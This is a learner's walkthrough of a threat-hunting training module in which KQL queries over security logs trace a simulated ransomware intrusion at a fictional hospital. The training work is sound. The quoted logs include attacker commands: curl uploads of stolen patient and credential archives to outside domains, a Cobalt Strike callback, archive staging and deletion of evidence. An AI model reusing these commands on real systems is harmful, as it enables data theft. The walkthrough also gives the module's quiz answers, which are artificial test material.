This module focuses on ransomware. We will  practice the critical skills of finding patient zero, tracing the intrusion vector, identifying exfiltration before encryption, and deciding when to trigger containment.

Our learning objectives here are:
- How to interpret Security Logs to identify evidence of malicious activity
- How to use Azure Data Explorer (ADX) and Kusto Query Language (KQL) to query logs
- How to formulate an analytical question and answer it using data

Our tags are: ransomware, double-extortion

Section 1: Crypto - But the Bad Kind
The first question requires us to watch a provided video. How many hours did the hackers give the hospital to pay the ransom?
72

The next question provides us with an image. What was the name of the ransomware group?
Lock Byte

From the same image - The slogan was: we spend your money, so ____
you don't have to

Another image provided - How much did the hackers ask the patients to pay?
$10,000

Same image as previous - What very important unique identifier number did the ransomware operators threaten to release?
Social Security Number

Now we are given data to work with. We are told that we can find the locked files by looking for files that end with ".encrypted". We are also given these queries:
FileCreationEvents
| where filename endswith ".encrypted"
&
FileCreationEvents
| where filename endswith ".encrypted"
| count
How many total files were encrypted at the hospital?
6420

How many unique hostnames had files encrypted on them?
Let's adjust our query to read something like:
FileCreationEvents
| where filename endswith ".encrypted"
| distinct hostname
| count
This will show us the COUNT of unique HOSTNAMES within the previous query.
Answer: 321

The hackers left a note on at least one of the computers telling the hospital how to pay the ransom. This note had a specific name We_Have_Your_Data_Pay_Up.txt. We are given this query: 
FileCreationEvents
| where filename == "We_Have_Your_Data_Pay_Up.txt"
What was the Sha256 hash of this ransom file?
Luckily, that's one of the columns when we run the query.
97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018

What was the full path of this ransom file?
C:\Users\andavis\Documents\We_Have_Your_Data_Pay_Up.txt

On how many hosts (machines) was this ransom file seen?
It gives us this query:
FileCreationEvents
| where filename == "We_Have_Your_Data_Pay_Up.txt"
| count
But I added in (before count):
| distinct hostname
Didn't matter, the answer is 1.

What hostname was the ransom note seen on?
Back to previous query:
FileCreationEvents
| where filename == "We_Have_Your_Data_Pay_Up.txt"
Answer: AMFB-MACHINE

We are then given this partially-filled-in query:
Employees
| where ____ == _____
What is the name of the employee whose host has the ransom note?
Let's take this step by step. So far, the query goes to the Employees database... and then does nothing else. Good start, at least. The where clause should have something like:
| where hostname == "AMFB-MACHINE"
Since we already knew the hostname, and it was an option in the Employees columns, it made sense to use the hostname to grab the employee's name.
Answer: Anthony Davis

Then, we are given:
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
And told to run the query above. How many process events were executed on Anthony's machine during this time period?
Answer: 14

One of the command mentions a "ransomer". What was the name of the ransomer file mentioned?
Let's just add this in to the previous query:
| where process_commandline contains "ransomer"
And if we expand that column, we see the file name is lockbyte_ransomer.exe

When the attackers copied the ransomer file to the network share, what new name did they give it?
The same result will show you that the answer is spread_ransomware.exe

Next, we are given this query:
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
What tool did the attackers use to steal the data? This will be a .exe file
If we run the query and investigate the process_commandline column a bit for each result, we'll see one that sticks out:
C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_1.zip /source \\jojos-hospital-server\important_data\patient_records
Answer: patient_data_exporter.exe

What information did the attackers put into patient_data_1.zip? Provide the full path of the network share \\something\like\this
I adjusted the prior query to include: | where process_commandline contains "patient_data_1.zip"
First result shows us: C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_1.zip /source \\jojos-hospital-server\important_data\patient_records
Answer: \\jojos-hospital-server\important_data\patient_records

What information did the attackers put into patient_data_2.zip? Provide the full path of the network share \\something\like\this
Same query, but adjust the 1 to a 2. First result, we see: C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_2.zip /source \\jojos-hospital-server\important_data\archive\patient-records
Answer: \\jojos-hospital-server\important_data\archive\patient-records

What information did the attackers put into patient_data_3.zip? Provide the full path of the network share \\something\like\this
You know the drill now. First result shows: C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_3.zip /source \\jojos-hospital-server\important_data\old-patient-data
Answer: \\jojos-hospital-server\important_data\old-patient-data

Next, we get an explanation of the curl command and we are asked what domain (e.g. abcd.com) the attackers sent the stolen data to?
Second result of the prior command shows: cmd.exe /c curl -T C:\Users\andavis\Documents\patient_data_3.zip https://secure-health-access.com/upload/patient_data_3.zip
Answer: secure-health-access.com

What command did they use to clear their tracks? Copy and paste the full command.
Let's remove the | where process_commandline contains "patient_data_3.zip" from the previous command and run it again. Let's look for the curl command, and then whatever came after it.
Answer: cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip

What domain was the patient data exporter file downloaded from?
We are given this query:
OutboundNetworkEvents
| where url has "patient_data_exporter.exe"
This will show us traffic going from the hospital to the internet, and filter by only showing the traffic that has "patient_data_exporter.exe" in the URL somewhere.
The URL shown is: https://secure-health-access.com/tools/patient_data_exporter.exe
Answer: secure-health-access.com

When was the patient data exporter file downloaded? (copy and paste the exact timestamp)
Now we have to write our own query. Let's first remember we need to go to FileCreationEvents. Then, we need to search for that file - patient_data_exporter.exe
FileCreationEvents
| where filename contains "patient_data_exporter.exe"
Our 1 result shows a timestamp of: 2024-06-17T14:22:29.000Z

How many distinct IPs does the domain secure-health-access.com resolve to?
We are told to remember the PassiveDNS queries from prior investigations:
PassiveDns
| where domain == "secure-health-access.com"
Let's add in:
| distinct ip
| count
Answer: 2

Which one of these IPs ends with the digit 1?
Just remove the count clause from the previous query.
Answer: 203.0.113.1

Which one of these IPs ends with the digit 2?
203.0.113.2

What additional domain name is associated with these IP addresses?
Back to PassiveDNS we go:
PassiveDns
| where ip in ("203.0.113.1", "203.0.113.2")
Answer: emr-help.net

How many requests did the hackers make to our website from these IPs?
We are given:
InboundNetworkEvents
| where src_ip  in ("ip_address", "ip_address")
After filling it in, we will see traffic coming from the outside world into the hospital network, filtered by a source IP (outside of the hospital) of the 2 we found above.
Answer: 37

The hackers were curious about how to bypass ___ at Jojo's hospital.
We are given:
InboundNetworkEvents
| where src_ip  in ("ip_address", "ip_address")
| where url has "bypass"
After filling it in, this will show internet traffic from the rest of the world to the hospital, filtered by those previous 2 IPs, and where the URL contains the keyword "bypass". Of course, if they are searching for a bypass to something, something remarkably sketchy is going on.
Our result shows: https://jojoshospital.org/search=how+to+bypass+security+JoJo%27s+Hospital
Answer: security

What was the first web request the hackers made using the term patient? (hint: it was a search). Paste the full url.
Just adjust the previous query to say "patient" instead of "bypass" and our first result shows: https://jojoshospital.org/search=JoJo%27s+Hospital+patient+records

Looks like they logged into one account! When did this login occur?
Here, we are directed to the AuthenticationEvents table.
AuthenticationEvents
| where src_ip  in ("203.0.113.1", "203.0.113.2")
Answer: 2024-05-20T00:00:00.000Z

Which IP address did the actors use for the login?
Same result, scroll to the right for the IP: 203.0.113.1

Whose account did the hackers login to? (provide a first and last name)
We are shown a username of andavis. Let's plug that into a new query for the Employees table and see what we find:
Employees
| where username == "andavis"
Answer: Anthony Davis
(Or we could have saved our prior query on Anthony.)


Section 2: Sharks in the Hospital Water
Whose credentials did the hackers use to access the hospital's network? (Enter first and last name)
Answer: Anthony Davis (still)

What was the domain name observed in the sponsored search result?
We are given an image. The answer comes directly from there: raisinkanes.com
(Uh oh, that isn't right!)

What is the legitimate domain for Raising Cane's?
raisingcanes.com

Look in the OutboundNetworkEvents table. How many web requests do we see going to the fake raisinkanes domain?
Let's develop a query:
OutboundNetworkEvents
| where url contains "raisinkanes.com"
This will show us traffic from the hospital to the outside world, and filter by that sneaky and fake domain name we just saw.
Answer: 26

How many unique employees were seen browsing to the fake raisinkanes domains? (hint distinct the src_ip)
Let's add a little bit to the end of our prior query, shall we?
| distinct src_ip
| count 
Answer: 24

Which of the malicious domains used for redirection starts with the word "nothing"?
We can simply adjust the query 2 prior:
OutboundNetworkEvents
| where url contains "nothing"
Answer: nothing-to-see-here.net

Which of the malicious domains used for redirection starts with the word "totally"?
More adjusting, and we see: totally-legit-domain.com

What is the name of the docx file they are redirected to?
Let's just add in:
| where url contains ".docx"
Answer: Raisin_Kane_Promo_Offer.docx

What is the name of the pdf file they are redirected to?
Adjust that previous line to ".pdf": Raisin_Kane_Free_Meal_Voucher.pdf

What is the hostname of the first person to download the suspicious docx file?
We are given:
FileCreationEvents
| where filename == "Raisin_Kane_Promo_Offer.docx"
Answer: RQJQ-MACHINE

When did this download occur? (copy and paste the timestamp)
Same first result as before: 2024-05-01T09:56:50.000Z

What was the Sha256 hash of the file?
bd886046266b909a8ca5f19f16e5606baf73194a70632c81fdc44ef39ba29712

Which browser was used to download this file? (look at the process_name)
chrome.exe

If we take a closer look at files that get dropped on that victim host, we find that a malicious .exe file gets dropped immediately after the docx file is downloaded on the 1st of May. What was the name of the malicious file dropped by the attackers?
We are given:
FileCreationEvents
| where hostname == "RQJQ-MACHINE"
Let's look for the docx, and then directly under it we see: C:\ProgramData\cobaltstrike.exe

Which command (process_commandline) shows the execution of the Raisin_Kane_Promo_Offer.docx file? (copy and paste the whole command)
We are given:
ProcessEvents
| where hostname == "RQJQ-MACHINE"
| where timestamp between (datetime(2024-05-01) .. datetime(2024-05-02))
Let's look for the file creations: "C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\evbrowne\Downloads\Raisin_Kane_Promo_Offer.docx"

What IP address do the hackers connect to using cobalt strike?
Using that same query, just 2 results below, we see: C:\ProgramData\cobaltstrike.exe --connect 93.238.22.122:50050

Over what port do the hackers connect to that IP address?
Same result: 50050

What was the first discovery command issued by the hackers? (hint: it has to do with a system)
We are given:
ProcessEvents
| where hostname == "RQJQ-MACHINE"
| where timestamp between (datetime(2024-05-02) .. datetime(2024-05-04))
Just scrolling through those results and we will see: systeminfo

How many of these short discovery commands did the attackers run?
There were 6 of those total; you can find them all from that same previous query.

What is Anthony Davis' hostname?
We already found this earlier, but let's run a query again in case we forgot.
Employees
| where name == "Anthony Davis"
All the way to the right, we see: AMFB-MACHINE

When did the attackers connect to their IP address using cobalt strike on Anthony Davis' machine?
Let's try:
ProcessEvents
| where hostname == "AMFB-MACHINE"
Unfortunately, that gives us 543 results, so let's narrow it down some more:
| where process_commandline contains ":50050"
(Since we remember the port they connected with)
Answer: 2024-05-14T12:24:45.000Z

Once they got on Anthony Davis' machine, the hackers wanted to get a better understanding of the entire hospital network. So they downloaded an advanced scanning tool. What was the name of this scanning tool?
We are given:
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-05-13) .. datetime(2024-05-17))
Scrolling through those results, we see: C:\Users\andavis\Downloads\advanced-ip-scanner.exe /silent

What was the name of the file the attackers exfiltrated to learn about the network? (hint: ___.pdf)
A few more results down, we see: cmd.exe /c copy C:\Users\andavis\Documents\network_diagrams.pdf \\jojos-hospital.org\backup\network_diagrams.pdf

What was the name of the file the attackers took that would have contained usernames and passwords?
Directly below that, we see: cmd.exe /c copy C:\Users\andavis\Documents\credentials.txt \\jojos-hospital.org\backup\credentials.txt

Before stealing this file, the attackers first compressed them into a zip file. This allowed the files to be smaller so they would attract less attention. What was the name of this zip file?
And 1 more down, we see:
cmd.exe /c powershell Compress-Archive -Path C:\Users\andavis\Documents\network_diagrams.pdf, C:\Users\andavis\Documents\credentials.txt -DestinationPath C:\Users\andavis\Desktop\important_network_info.zip

Which domain did the attackers send the zip to?
2 more further down:
cmd.exe /c curl -F "file=@C:\Users\andavis\Desktop\important_network_info.zip" https://nothing-to-see-here.net/upload
